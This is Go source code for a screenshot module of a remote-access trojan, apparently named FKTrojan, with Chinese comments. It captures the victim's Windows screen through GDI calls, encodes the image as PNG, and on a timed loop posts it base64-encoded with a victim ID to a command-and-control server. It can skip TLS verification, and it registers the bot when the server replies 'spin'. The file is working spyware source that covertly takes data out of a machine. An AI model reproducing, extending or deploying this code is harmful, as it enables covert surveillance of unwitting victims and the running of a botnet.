/*
Author: FreeKnight
截屏功能
*/
//	img, err := components.CaptureScreen(true)
//	if err != nil {
//		panic(err)
//	}
//	n_Batch2, _ := os.Create("test.png")
//	n_Batch2.WriteString(string(img))
//	n_Batch2.Close()
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"bytes"
	"crypto/tls"
	"fmt"
	"image"
	"image/png"
	"io/ioutil"
	"net/http"
	"net/url"
	"reflect"
	"time"
	"unsafe"

	"github.com/AllenDang/w32"
)

//------------------------------------------------------------
// 截屏保存为到缓存
// compressImage 是否压缩图片
func captureScreen(compressImage bool) ([]byte, error) {
	r, e := getScreenRectSize()
	if e != nil {
		return nil, e
	}
	return captureRect(compressImage, r)
}

//------------------------------------------------------------
// 获取当前屏幕大小
func getScreenRectSize() (image.Rectangle, error) {
	hDC := w32.GetDC(0)
	if hDC == 0 {
		return image.Rectangle{}, fmt.Errorf("Could not Get primary display err:%d\n", w32.GetLastError())
	}
	defer w32.ReleaseDC(0, hDC)
	x := w32.GetDeviceCaps(hDC, w32.HORZRES)
	y := w32.GetDeviceCaps(hDC, w32.VERTRES)
	return image.Rect(0, 0, x, y), nil
}

//------------------------------------------------------------
// 屏幕截屏并压缩
func captureRect(compressImage bool, rect image.Rectangle) ([]byte, error) {
	hDC := w32.GetDC(0)
	if hDC == 0 {
		return nil, fmt.Errorf("Could not Get primary display err:%d.\n", w32.GetLastError())
	}
	defer w32.ReleaseDC(0, hDC)

	m_hDC := w32.CreateCompatibleDC(hDC)
	if m_hDC == 0 {
		return nil, fmt.Errorf("Could not Create Compatible DC err:%d.\n", w32.GetLastError())
	}
	defer w32.DeleteDC(m_hDC)

	x, y := rect.Dx(), rect.Dy()

	bt := w32.BITMAPINFO{}
	bt.BmiHeader.BiSize = uint32(reflect.TypeOf(bt.BmiHeader).Size())
	bt.BmiHeader.BiWidth = int32(x)
	bt.BmiHeader.BiHeight = int32(-y)
	bt.BmiHeader.BiPlanes = 1
	bt.BmiHeader.BiBitCount = 32
	bt.BmiHeader.BiCompression = w32.BI_RGB

	ptr := unsafe.Pointer(uintptr(0))

	m_hBmp := w32.CreateDIBSection(m_hDC, &bt, w32.DIB_RGB_COLORS, &ptr, 0, 0)
	if m_hBmp == 0 {
		return nil, fmt.Errorf("Could not Create DIB Section err:%d.\n", w32.GetLastError())
	}
	if m_hBmp == w32.InvalidParameter {
		return nil, fmt.Errorf("One or more of the input parameters is invalid while calling CreateDIBSection.\n")
	}
	defer w32.DeleteObject(w32.HGDIOBJ(m_hBmp))

	obj := w32.SelectObject(m_hDC, w32.HGDIOBJ(m_hBmp))
	if obj == 0 {
		return nil, fmt.Errorf("error occurred and the selected object is not a region err:%d.\n", w32.GetLastError())
	}
	if obj == 0xffffffff { //GDI_ERROR
		return nil, fmt.Errorf("GDI_ERROR while calling SelectObject err:%d.\n", w32.GetLastError())
	}
	defer w32.DeleteObject(obj)

	w32.BitBlt(m_hDC, 0, 0, x, y, hDC, rect.Min.X, rect.Min.Y, w32.SRCCOPY)

	var slice []byte
	hdrp := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
	hdrp.Data = uintptr(ptr)
	hdrp.Len = x * y * 4
	hdrp.Cap = x * y * 4

	var imageBytes []byte
	var err error
	buf := new(bytes.Buffer)

	if compressImage {
		imageBytes = make([]byte, len(slice)/4)
		j := 0
		for i := 0; i < len(slice); i += 4 {
			imageBytes[j] = slice[i]
			j++
		}
		// 使用灰度图以节省空间
		img := &image.Gray{imageBytes, x, image.Rect(0, 0, x, y)}
		err = png.Encode(buf, img)
	} else {
		imageBytes = make([]byte, len(slice))
		for i := 0; i < len(imageBytes); i += 4 {
			imageBytes[i], imageBytes[i+2], imageBytes[i+1], imageBytes[i+3] = slice[i+2], slice[i], slice[i+1], 255
		}
		img := &image.RGBA{imageBytes, 4 * x, image.Rect(0, 0, x, y)}
		err = png.Encode(buf, img)
	}
	return buf.Bytes(), err
}

//------------------------------------------------------------
// 发送屏幕截图到服务器
func sendScreenshotToServer() {
	for autoScreenShot {
		// 多休息休息
		time.Sleep(time.Duration(autoScreenShotInterval) * time.Minute)
		// 截个屏
		bty, _ := captureScreen(true)

		client := http.DefaultClient
		if useSSL {
			tr := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
			}
			client = &http.Client{Transport: tr}
		} else {
			client = &http.Client{}
		}

		if client == http.DefaultClient {
			continue
		}

		FKDebugLog("Sending screen shot to server...")

		data := url.Values{}
		data.Set("0", myUID)
		data.Add("1", common.Base64Encode(string(bty)))
		u, _ := url.ParseRequestURI(serverAddress + "ss")
		urlStr := fmt.Sprintf("%v", u)
		r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
		r.Header.Set("User-Agent", userAgentKey)
		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(r)
		if err != nil {
		} else {
			defer resp.Body.Close()
			resp_body, _ := ioutil.ReadAll(resp.Body)
			if resp.StatusCode == 200 {
				if len(string(resp_body)) > 2 {
					if string(resp_body) == "spin" {
						registerBot()
					} else {
					}
				}
			}
		}
	}
}

//------------------------------------------------------------
